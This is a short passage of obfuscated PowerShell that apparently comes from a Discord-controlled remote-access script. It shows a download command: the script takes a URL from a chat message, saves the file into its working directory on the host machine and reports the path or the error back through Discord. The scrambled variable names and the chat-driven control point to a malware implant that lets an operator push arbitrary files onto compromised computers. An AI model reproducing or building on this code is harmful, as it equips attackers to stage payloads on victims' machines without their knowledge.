                $RG6Zka = $kgICGVXv[0]
                try { $dfaOgfK = [uri]$RG6Zka } catch { Send-DiscordMessage -Content "invalid URL" -ReplyToId $msgId; return }
                $iTRaf = if ($kgICGVXv.Count -gt 1) { $kgICGVXv[1].Trim().Trim('"') } else { $XfeP = [System.IO.Path]::GetFileName($dfaOgfK.LocalPath); if (-not $XfeP) { $XfeP = "dl_$(Get-Date -Format 'HHmmss')" }; $XfeP }
                if (-not [System.IO.Path]::IsPathRooted($iTRaf)) { $iTRaf = Join-Path $script:workDir $iTRaf }
                try { Invoke-WebRequest -Uri $RG6Zka -OutFile $iTRaf -UseBasicParsing; Send-DiscordMessage -Content "``$iTRaf``" -ReplyToId $msgId } catch { Send-DiscordMessage -Content "ERR: $_" -ReplyToId $msgId }
